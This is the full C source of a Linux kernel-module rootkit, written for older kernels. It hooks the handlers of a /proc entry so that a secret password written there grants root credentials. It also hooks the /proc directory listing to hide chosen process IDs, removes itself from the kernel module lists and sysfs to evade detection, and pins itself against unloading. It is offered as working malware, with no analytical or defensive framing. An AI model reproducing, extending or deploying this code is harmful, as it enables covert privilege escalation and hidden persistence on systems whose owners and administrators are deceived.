/* Declaring everything static confines all variables and functions to the module (rootkit) --
 * they won't be exported to /proc/kallsyms. As a result, the rootkit is harder to detect. */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/sched.h>
#include <linux/string.h>
#include <linux/cred.h>
#include <linux/stat.h>
#include <linux/uaccess.h>
#include <linux/file.h>

#include "rootkit.conf.h"

MODULE_LICENSE("GPL");

static int failed;
static char pid[10][32];
static int pid_index;

/* The following pointers save the original, replaced pointers.
 * They are retrieved during the module unload. */
static int (*old_proc_readdir)(struct file *, void *, filldir_t);
static filldir_t old_filldir;
static ssize_t (*old_fops_write)(struct file *, const char __user *,
 				size_t, loff_t *);
static ssize_t (*old_fops_read)(struct file *, char __user *, size_t, loff_t *);
static write_proc_t *old_write;
static read_proc_t *old_read;

static struct proc_dir_entry *ptr; 			/* pointer to infected entry */
static struct proc_dir_entry *root;			/* pointer to /proc directory */
static struct list_head *prev;				/* pointer to the module entry that is above the rootkit
 											 * in main modules list -- so we know where to put the 
 											 * rootkit entry when shown */
static struct file_operations *fops; 		/* file_operations of infected entry */
static struct file_operations *root_fops;	/* file_operations of /proc */

static inline void module_remember_info(void) {
	prev = THIS_MODULE->list.prev;
}

static inline void module_show(void) {
	list_add(&THIS_MODULE->list, prev);		/* adds rootkit to main module list */
}

/* The parameter of the check_buf function is 
 * the pointer to the buffer that should hold commands */ 
static int check_buf(const char __user *buf) {
	struct cred *new = prepare_creds();			/* gain root privileges */
	if (!strcmp(buf, password)) {
		new->uid = new->euid = 0;
		new->gid = new->egid = 0;
		commit_creds(new);

	} else if (!strcmp(buf, module_release)) {	/* allow rootkit to be unloaded with rmmod */
		module_put(THIS_MODULE);

	} else if (!strcmp(buf, module_uncover)) {	/* make the rootkit visible */
		module_show();

	} else if (!strncmp(buf, hide_proc, strlen(hide_proc))) {		/* hide rootkit process */
		if (pid_index > 9) {
			return 0;
		}
		sprintf(pid[pid_index], "%s", buf+5);
		pid_index++;
	
	} else if (!strncmp(buf, unhide_proc, strlen(unhide_proc))) {	/* show last hidden process */
		if (!pid_index) {
			return 0;
		}
		pid_index--;

	} else {
		return 1;
	}

	return 0;
}										 

/* Custom write function */
static int buf_write(struct file *file, const char __user *buf, 
					 unsigned long count, void *data) {
	if (!check_buf(buf)) {						/* if check_buf return is 0 -- 
												 * there was a command passed */
		return count;
	}
	return old_write(file, buf, count, data);	/* otherwise execute the (original) 
												 * write function normally */
}

/* Custom read function for read_proc field */
static int buf_read(char __user *buf, char **start, off_t off, 
					int count, int *eof, void *data) {
	if (!check_buf(buf)) {								/* if check_buf return is 0 --
														 * there was a command passed */
		return count;
	}
	return old_read(buf, start, off, count, eof, data);	/* otherwise execute the (original) 
														 * read function normally */
}

/* Custom file_operations structure write function */
static ssize_t fops_write(struct file *file, const char __user *buf_user,
						  size_t count, loff_t *p) {
	if (!check_buf(buf_user)) {
		return count;
	}
	return old_fops_write(file, buf_user, count, p);
}

/* Custom file_operations structure read function */
static ssize_t fops_read(struct file *file, char __user *buf_user,
						 size_t count, loff_t *p) {
	if (!check_buf(buf_user)) {
		return count;
	}
	return old_fops_read(file, buf_user, count, p);
}

/* Custom filldir function */
static int new_filldir(void *__buf, const char *name, int namelen,
					   loff_t offset, u64 ino, unsigned d_type) {
	int i;
	for (i = 0; i < pid_index; i++) {
		if (!strcmp(name, pid[i])) {
			return 0;
		}	
	}
	return old_filldir(__buf, name, namelen, offset, ino, d_type);
}

/* Custom readdir function */
static int new_proc_readdir(struct file *filp, void *dirent, filldir_t filldir) {
	old_filldir = filldir;								/* to invoke the original filldir in new_filldir */
	return old_proc_readdir(filp, dirent, new_filldir);	/* invoke original readdir, but pass pointer to our filldir */
}

/* Replace /proc readdir function with rootkit custom readdir */
static inline void change_proc_root_readdir(void) {
	root_fops = (struct file_operations *)root->proc_fops;
	old_proc_readdir = root_fops->readdir;
	root_fops->readdir = new_proc_readdir;
}

static inline void proc_init(void) {
	ptr = create_proc_entry("temporary", 0444, NULL);
	ptr = ptr->parent;								/* ptr->parent was pointer to /proc --
													 * if it's not, we've got problems */
	if (strcmp(ptr->name, "/proc") != 0) {
		failed = 1;
		return;
	}
	root = ptr;
	remove_proc_entry("temporary", NULL);
	change_proc_root_readdir(); 					/* change the /proc readdir function */
	ptr = ptr->subdir;

	while (ptr) {									/* searching for entry to infect */
		if (0 == strcmp(ptr->name, passwaiter)) {
			goto found;								/* DING DING DING!!! we found it! */
		}
		ptr = ptr->next;							/* otherwise, on to the next entry */
	}
	failed = 1;
	return;

	found:

		/* Save the original pointers -- these will be 
		 * restored when rootkit is unloaded */
		old_write = ptr->write_proc;
		old_read = ptr->read_proc;

		fops = (struct file_operations *)ptr->proc_fops;	/* pointer to file_operations structure 
															 * of infected entry */
		old_fops_read = fops->read;
		old_fops_write = fops->write;

		/* Replace write_proc/read_proc */
		if (ptr->write_proc) {
			ptr->write_proc = buf_write;
		} else if (ptr->read_proc) {
			ptr->read_proc = buf_read;
		}

		/* Replace read/write from file_operations */
		if (fops->write) {
			fops->write = fops_write;
		} else if (fops->read) {
			fops->read = fops_read;
		}

		/* Throw an error if there aren't any read/write functions */
		if (!ptr->read_proc && !ptr->write_proc 
			&& !fops->read && !fops->write) {
			failed = 1;
			return;
		}
}	

/* The following function does some cleanups.
 * If some pointers aren't set to NULL,
 * Oops can occur when unloading the rootkit. 
 * Some structures are also freed to save memory. */
 static inline void tidy(void) {
 	kfree(THIS_MODULE->notes_attrs);
 	THIS_MODULE->notes_attrs = NULL;
 	kfree(THIS_MODULE->sect_attrs);
 	THIS_MODULE->sect_attrs = NULL;
 	kfree(THIS_MODULE->mkobj.mp);
 	THIS_MODULE->mkobj.mp = NULL;
 	THIS_MODULE->modinfo_attrs->attr.name = NULL;
 	kfree(THIS_MODULE->mkobj.drivers_dir);
 	THIS_MODULE->mkobj.drivers_dir = NULL;
 }

 /* Delete some structures from lists to make the rootkit harder to detect */
 static inline void rootkit_hide(void) {
 	list_del(&THIS_MODULE->list);
 	kobject_del(&THIS_MODULE->mkobj.kobj);
 	list_del(&THIS_MODULE->mkobj.kobj.entry);
 }

 static inline void rootkit_protect(void) {
 	try_module_get(THIS_MODULE);
 }

 static int __init rootkit_init(void) {
 	module_remember_info();
 	proc_init();
 	if (failed) {
 		return 0;
 	}
 	rootkit_hide();
 	tidy();
 	rootkit_protect();

 	return 0;
 }

 static void __exit rootkit_exit(void) {
 	if (failed) {							/* if failed, no cleanups are necessary */
 		return;
 	}
 	root_fops->readdir = old_proc_readdir;
 	fops->write = old_fops_write;
 	fops->read = old_fops_read;
 	ptr->write_proc = old_write;
 	ptr->read_proc = old_read;
 }


 module_init(rootkit_init);
 module_exit(rootkit_exit);